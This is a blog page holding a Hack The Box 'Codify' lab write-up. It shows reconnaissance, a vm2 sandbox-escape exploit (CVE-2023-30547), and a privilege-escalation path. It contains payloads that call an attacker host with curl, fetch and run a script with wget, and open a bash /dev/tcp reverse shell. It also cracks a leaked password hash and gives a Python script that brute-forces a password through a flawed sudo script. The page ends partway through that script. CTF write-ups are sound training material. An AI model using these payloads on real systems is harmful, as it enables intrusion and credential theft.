<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="Easy - Codify (machine) User flag Leaked info from html:
support@codify.htb Nmap scanning:
../p8/codify➤ sudo nmap -n -Pn -sV -O -T4 codify.htb ... 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 3000/tcp open http Node.js Express framework ... There is a place where we can run commands: The app is using this lib &#x1f4be; vm2 v3.9.16 Ok, someone already published a CVE for a known vulnerability: https://github."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="Easy - Codify (machine) User flag Leaked info from html:
support@codify.htb Nmap scanning:
../p8/codify➤ sudo nmap -n -Pn -sV -O -T4 codify.htb ... 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 3000/tcp open http Node.js Express framework ... There is a place where we can run commands: The app is using this lib &#x1f4be; vm2 v3.9.16 Ok, someone already published a CVE for a known vulnerability: https://github."><meta property="og:title" content><meta property="og:description" content="Easy - Codify (machine) User flag Leaked info from html:
support@codify.htb Nmap scanning:
../p8/codify➤ sudo nmap -n -Pn -sV -O -T4 codify.htb ... 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 3000/tcp open http Node.js Express framework ... There is a place where we can run commands: The app is using this lib &#x1f4be; vm2 v3.9.16 Ok, someone already published a CVE for a known vulnerability: https://github."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb-notes/machines/easy/codify/"><meta property="article:section" content="infosec"><title>Easy - Codify (machine) </title><link rel=canonical href=https://www.darvein.net/infosec/htb-notes/machines/easy/codify/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=easy---codify-machine>Easy - Codify (machine)
<a class=heading-link href=#easy---codify-machine><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Leaked info from html:</p><ul><li><a href=../mailto:support@codify.htb>support@codify.htb</a></li></ul><p><strong>Nmap scanning:</strong></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>../p8/codify➤ sudo nmap -n -Pn -sV -O -T4 codify.htb
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>80/tcp   open  http    Apache httpd 2.4.52
</span></span><span style=display:flex><span>3000/tcp open  http    Node.js Express framework
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>There is a place where we can run commands:<figure class=image-container><a href=../../../images/2024-01-11_17-16.png><img width="Editor webpage%" src=../../../images/2024-01-11_17-16.png alt="Editor webpage"></a></figure></p><p>The app is using this lib &#x1f4be;
<a href=https://github.com/patriksimek/vm2/releases/tag/3.9.16>vm2 v3.9.16</a></p><p>Ok, someone already published a CVE for a known vulnerability:
<a href=https://github.com/rvizx/CVE-2023-30547>https://github.com/rvizx/CVE-2023-30547</a>
.</p><p>Actually this one is the official:
<a href=https://github.com/advisories/GHSA-cchq-frgv-rjh5>https://github.com/advisories/GHSA-cchq-frgv-rjh5</a></p><ul><li>The vuln allows attacker RCE via the <code>promise</code> functionality.</li></ul><p><code>vm2</code> is a tool that allow users to run code in a sandboxed environment where some nodejs functionalities can be whitelisted (to make it some secure? &#x1f480;). The usage of the tool is not recommended:<figure class=image-container><a href=../../../images/2024-01-11_17-24.png><img width=vm2% src=../../../images/2024-01-11_17-24.png alt=vm2></a></figure></p><h3 id=testing-the-cves-poc>Testing the CVE&rsquo;s PoC
<a class=heading-link href=#testing-the-cves-poc><i class="fa fa-link" aria-hidden=true></i></a></h3><p><a href=https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9>https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9</a></p><p>The code being executed is:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#fb660a;font-weight:700>async</span> <span style=color:#fb660a;font-weight:700>function</span> fn() {
</span></span><span style=display:flex><span>    (<span style=color:#fb660a;font-weight:700>function</span> stack() {
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>new</span> Error().stack;
</span></span><span style=display:flex><span>        stack();
</span></span><span style=display:flex><span>    })();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>p = fn();
</span></span><span style=display:flex><span>p.constructor = {
</span></span><span style=display:flex><span>    [Symbol.species]: <span style=color:#fb660a;font-weight:700>class</span> FakePromise {
</span></span><span style=display:flex><span>        constructor(executor) {
</span></span><span style=display:flex><span>            executor(
</span></span><span style=display:flex><span>                (x) =&gt; x,
</span></span><span style=display:flex><span>                (err) =&gt; { <span style=color:#fb660a;font-weight:700>return</span> err.constructor.constructor(<span style=color:#0086d2>&#39;return process&#39;</span>)().mainModule.require(<span style=color:#0086d2>&#39;child_process&#39;</span>).execSync(<span style=color:#0086d2>&#39;curl 10.10.14.31:55555/what.php&#39;</span>); }
</span></span><span style=display:flex><span>            )
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>p.then();
</span></span></code></pre></div><p>Here we&rsquo;ve got a http ping:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>../p8/codify➤ python -m http.server <span style=color:#0086f7;font-weight:700>55555</span>
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#0086f7;font-weight:700>55555</span> (http://0.0.0.0:55555/) ...
</span></span><span style=display:flex><span>10.10.11.239 - - [11/Jan/2024 17:27:37] code 404, message File not found
</span></span><span style=display:flex><span>10.10.11.239 - - [11/Jan/2024 17:27:37] <span style=color:#0086d2>&#34;GET /what.php HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>404</span> -
</span></span></code></pre></div><p>Ok, so I was able to get a rev shell with these payload:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#fb660a;font-weight:700>async</span> <span style=color:#fb660a;font-weight:700>function</span> fn() {
</span></span><span style=display:flex><span>    (<span style=color:#fb660a;font-weight:700>function</span> stack() {
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>new</span> Error().stack;
</span></span><span style=display:flex><span>        stack();
</span></span><span style=display:flex><span>    })();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>p = fn();
</span></span><span style=display:flex><span>p.constructor = {
</span></span><span style=display:flex><span>    [Symbol.species]: <span style=color:#fb660a;font-weight:700>class</span> FakePromise {
</span></span><span style=display:flex><span>        constructor(executor) {
</span></span><span style=display:flex><span>            executor(
</span></span><span style=display:flex><span>                (x) =&gt; x,
</span></span><span style=display:flex><span>                (err) =&gt; { <span style=color:#fb660a;font-weight:700>return</span> err.constructor.constructor(<span style=color:#0086d2>&#39;return process&#39;</span>)().mainModule.require(<span style=color:#0086d2>&#39;child_process&#39;</span>).execSync(<span style=color:#0086d2>&#39;wget 10.10.14.31:55556/x -O x; bash ./x&#39;</span>); }
</span></span><span style=display:flex><span>            )
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>p.then();
</span></span></code></pre></div><p>The revshell: <code>bash -i >& /dev/tcp/10.10.14.31/55555 0>&amp;1</code></p><h3 id=trying-to-get-into-joshua-home-dir>Trying to get into joshua home dir
<a class=heading-link href=#trying-to-get-into-joshua-home-dir><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>svc@codify:~$ id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1001(svc) <span style=color:#fb660a>gid</span>=1001(svc) <span style=color:#fb660a>groups</span>=1001(svc)
</span></span><span style=display:flex><span>svc@codify:~$ file pwned
</span></span><span style=display:flex><span>file pwned
</span></span><span style=display:flex><span>pwned: empty
</span></span><span style=display:flex><span>svc@codify:~$ ls /home
</span></span><span style=display:flex><span>ls /home
</span></span><span style=display:flex><span>joshua
</span></span><span style=display:flex><span>svc
</span></span><span style=display:flex><span>svc@codify:~$ ls /home/joshua
</span></span><span style=display:flex><span>ls /home/joshua
</span></span><span style=display:flex><span>ls: cannot open directory <span style=color:#0086d2>&#39;/home/joshua&#39;</span>: Permission denied
</span></span><span style=display:flex><span>svc@codify:~$ cat /etc/passwd
</span></span><span style=display:flex><span>cat /etc/passwd
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>pollinate:x:105:1::/var/cache/pollinate:/bin/false
</span></span><span style=display:flex><span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>syslog:x:107:113::/home/syslog:/usr/sbin/nologin
</span></span><span style=display:flex><span>uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
</span></span><span style=display:flex><span>tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style=display:flex><span>landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style=display:flex><span>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span style=display:flex><span>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style=display:flex><span>dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
</span></span><span style=display:flex><span>joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
</span></span><span style=display:flex><span>svc:x:1001:1001:,,,:/home/svc:/bin/bash
</span></span><span style=display:flex><span>fwupd-refresh:x:114:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>_laurel:x:998:998::/var/log/laurel:/bin/false
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>svc@codify:~$ ls -ltra /var/www
</span></span><span style=display:flex><span>ls -ltra /var/www
</span></span><span style=display:flex><span>total <span style=color:#0086f7;font-weight:700>20</span>
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#0086f7;font-weight:700>2</span> svc  svc  <span style=color:#0086f7;font-weight:700>4096</span> Apr <span style=color:#0086f7;font-weight:700>12</span>  <span style=color:#0086f7;font-weight:700>2023</span> html
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#0086f7;font-weight:700>5</span> root root <span style=color:#0086f7;font-weight:700>4096</span> Sep <span style=color:#0086f7;font-weight:700>12</span> 17:40 .
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#0086f7;font-weight:700>3</span> svc  svc  <span style=color:#0086f7;font-weight:700>4096</span> Sep <span style=color:#0086f7;font-weight:700>12</span> 17:45 contact
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#0086f7;font-weight:700>4</span> svc  svc  <span style=color:#0086f7;font-weight:700>4096</span> Sep <span style=color:#0086f7;font-weight:700>12</span> 17:46 editor
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#0086f7;font-weight:700>13</span> root root <span style=color:#0086f7;font-weight:700>4096</span> Oct <span style=color:#0086f7;font-weight:700>31</span> 07:57 ..
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>svc@codify:/var/www$ find . -type f | grep -v node_modules
</span></span><span style=display:flex><span>find . -type f | grep -v node_modules
</span></span><span style=display:flex><span>./editor/package.json
</span></span><span style=display:flex><span>./editor/templates/editor.html
</span></span><span style=display:flex><span>./editor/templates/index.html
</span></span><span style=display:flex><span>./editor/templates/about.html
</span></span><span style=display:flex><span>./editor/templates/limitations.html
</span></span><span style=display:flex><span>./editor/package-lock.json
</span></span><span style=display:flex><span>./editor/index.js
</span></span><span style=display:flex><span>./html/index.html
</span></span><span style=display:flex><span>./contact/package.json
</span></span><span style=display:flex><span>./contact/templates/ticket.html
</span></span><span style=display:flex><span>./contact/templates/login.html
</span></span><span style=display:flex><span>./contact/templates/tickets.html
</span></span><span style=display:flex><span>./contact/package-lock.json
</span></span><span style=display:flex><span>./contact/tickets.db
</span></span><span style=display:flex><span>./contact/index.js
</span></span></code></pre></div><p>There is this sqlite database file:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>svc@codify:/var/www$ strings ./contact/tickets.db
</span></span><span style=display:flex><span>strings ./contact/tickets.db
</span></span><span style=display:flex><span>SQLite format <span style=color:#0086f7;font-weight:700>3</span>
</span></span><span style=display:flex><span>otableticketstickets
</span></span><span style=display:flex><span>CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P
</span></span><span style=display:flex><span>Ytablesqlite_sequencesqlite_sequence
</span></span><span style=display:flex><span>CREATE TABLE sqlite_sequence(name,seq)
</span></span><span style=display:flex><span>        tableusersusers
</span></span><span style=display:flex><span>CREATE TABLE users (
</span></span><span style=display:flex><span>        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span><span style=display:flex><span>        username TEXT UNIQUE,
</span></span><span style=display:flex><span>        password TEXT
</span></span><span style=display:flex><span>    ))
</span></span><span style=display:flex><span>indexsqlite_autoindex_users_1users
</span></span><span style=display:flex><span>joshua<span style=color:#fb660a>$2</span>a<span style=color:#fb660a>$12$SOn8Pf6z8fO</span>/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
</span></span><span style=display:flex><span>joshua
</span></span><span style=display:flex><span>users
</span></span><span style=display:flex><span>tickets
</span></span><span style=display:flex><span>Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open
</span></span><span style=display:flex><span>Tom HanksNeed networking modulesI think it would be better <span style=color:#fb660a;font-weight:700>if</span> you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
</span></span></code></pre></div><p>Let&rsquo;s try cracking the hash: `john -w=/usr/share/dict/rockyou.txt hash.txt``</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>...
</span></span><span style=display:flex><span>Press <span style=color:#0086d2>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#fb660a;font-weight:700>for</span> status
</span></span><span style=display:flex><span>**************       (?)
</span></span></code></pre></div><p>And we are in!!</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>../p8/codify➤ ssh joshua@codify.htb
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>joshua@codify:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(joshua) <span style=color:#fb660a>gid</span>=1000(joshua) <span style=color:#fb660a>groups</span>=1000(joshua)
</span></span></code></pre></div><h2 id=root-flag>Root flag
<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>So we have this sudo permission:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>...
</span></span><span style=display:flex><span>User joshua may run the following commands on codify:
</span></span><span style=display:flex><span>    (root) /opt/scripts/mysql-backup.sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#!/bin/bash</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>DB_USER</span>=<span style=color:#0086d2>&#34;root&#34;</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>DB_PASS</span>=<span style=color:#fb660a;font-weight:700>$(</span>/usr/bin/cat /root/.creds<span style=color:#fb660a;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>BACKUP_DIR</span>=<span style=color:#0086d2>&#34;/var/backups/mysql&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>read -s -p <span style=color:#0086d2>&#34;Enter MySQL password for </span><span style=color:#fb660a>$DB_USER</span><span style=color:#0086d2>: &#34;</span> USER_PASS
</span></span><span style=display:flex><span>/usr/bin/echo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>if</span> [[ <span style=color:#fb660a>$DB_PASS</span> == <span style=color:#fb660a>$USER_PASS</span> ]]; <span style=color:#fb660a;font-weight:700>then</span>
</span></span><span style=display:flex><span>        /usr/bin/echo <span style=color:#0086d2>&#34;Password confirmed!&#34;</span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>else</span>
</span></span><span style=display:flex><span>        /usr/bin/echo <span style=color:#0086d2>&#34;Password confirmation failed!&#34;</span>
</span></span><span style=display:flex><span>        exit <span style=color:#0086f7;font-weight:700>1</span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/usr/bin/mkdir -p <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$BACKUP_DIR</span><span style=color:#0086d2>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>databases</span>=<span style=color:#fb660a;font-weight:700>$(</span>/usr/bin/mysql -u <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$DB_USER</span><span style=color:#0086d2>&#34;</span> -h 0.0.0.0 -P <span style=color:#0086f7;font-weight:700>3306</span> -p<span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$DB_PASS</span><span style=color:#0086d2>&#34;</span> -e <span style=color:#0086d2>&#34;SHOW DATABASES;&#34;</span> | /usr/bin/grep -Ev <span style=color:#0086d2>&#34;(Database|information_schema|performance_schema)&#34;</span><span style=color:#fb660a;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>for</span> db in <span style=color:#fb660a>$databases</span>; <span style=color:#fb660a;font-weight:700>do</span>
</span></span><span style=display:flex><span>    /usr/bin/echo <span style=color:#0086d2>&#34;Backing up database: </span><span style=color:#fb660a>$db</span><span style=color:#0086d2>&#34;</span>
</span></span><span style=display:flex><span>    /usr/bin/mysqldump --force -u <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$DB_USER</span><span style=color:#0086d2>&#34;</span> -h 0.0.0.0 -P <span style=color:#0086f7;font-weight:700>3306</span> -p<span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$DB_PASS</span><span style=color:#0086d2>&#34;</span> <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$db</span><span style=color:#0086d2>&#34;</span> | /usr/bin/gzip &gt; <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$BACKUP_DIR</span><span style=color:#0086d2>/</span><span style=color:#fb660a>$db</span><span style=color:#0086d2>.sql.gz&#34;</span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#0086d2>&#34;All databases backed up successfully!&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#0086d2>&#34;Changing the permissions&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/chown root:sys-adm <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$BACKUP_DIR</span><span style=color:#0086d2>&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/chmod <span style=color:#0086f7;font-weight:700>774</span> -R <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$BACKUP_DIR</span><span style=color:#0086d2>&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#0086d2>&#39;Done!&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>joshua@codify:~$ ls -ltra  /opt/scripts/mysql-backup.sh
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>928</span> Nov  <span style=color:#0086f7;font-weight:700>2</span> 12:26 /opt/scripts/mysql-backup.sh
</span></span></code></pre></div><p>So, the <code>if</code> condition in the bash script allows to enter wildcard/regex? expresions, for instance if we put a simple <code>*</code> as password the script gets executed succesfully:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
</span></span><span style=display:flex><span>Enter MySQL password <span style=color:#fb660a;font-weight:700>for</span> root:
</span></span><span style=display:flex><span>Password confirmed!
</span></span><span style=display:flex><span>mysql: [Warning] Using a password on the command line interface can be insecure.
</span></span><span style=display:flex><span>Backing up database: mysql
</span></span><span style=display:flex><span>mysqldump: [Warning] Using a password on the command line interface can be insecure.
</span></span><span style=display:flex><span>-- Warning: column statistics not supported by the server.
</span></span><span style=display:flex><span>mysqldump: Got error: 1556: You can<span style=color:#0086d2>&#39;t use locks with log tables when using LOCK TABLES
</span></span></span><span style=display:flex><span><span style=color:#0086d2>mysqldump: Got error: 1556: You can&#39;</span>t use locks with log tables when using LOCK TABLES
</span></span><span style=display:flex><span>Backing up database: sys
</span></span><span style=display:flex><span>mysqldump: [Warning] Using a password on the command line interface can be insecure.
</span></span><span style=display:flex><span>-- Warning: column statistics not supported by the server.
</span></span><span style=display:flex><span>All databases backed up successfully!
</span></span><span style=display:flex><span>Changing the permissions
</span></span><span style=display:flex><span>Done!
</span></span></code></pre></div><h3 id=brute-forcing-root-mysql-password>Brute-forcing root mysql password
<a class=heading-link href=#brute-forcing-root-mysql-password><i class="fa fa-link" aria-hidden=true></i></a></h3><p>So given that we have two outputs from running the script, we have two different text results which is kind of a blind brute-forcing.</p><p>The server has python3 installed, so here an script that can help:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> string
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> subprocess
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>password = <span style=color:#0086d2>&#34;&#34;</span>
</span></span><span style=display:flex><span>chars = string.ascii_letters + string.digits <span style=color:#080;background-color:#0f140f;font-style:italic># alphabet and digits only</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>while</span> <span style=color:#fb660a;font-weight:700>True</span>:
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>for</span> c in chars:
</span></span><span style=display:flex><span>        cmd = <span style=color:#0086d2>&#34;echo &#39;</span><span style=color:#0086d2>{}{}</span><span style=color:#0086d2>*&#39; | sudo /opt/scripts/mysql-backup.sh&#34;</span>.format(password, c)
</span></span><span style=display:flex><span>        output = subprocess.run(cmd, capture_output=<span style=color:#fb660a;font-weight:700>True</span>, shell=<span style=color:#fb660a;font-weight:700>True</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#0086d2>&#34;Password confirmed&#34;</span> in output.stdout.decode(<span style=color:#0086d2>&#34;utf-8&#34;</span>):
</span></span><span style=display:flex><span>            password += c
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>break</span>
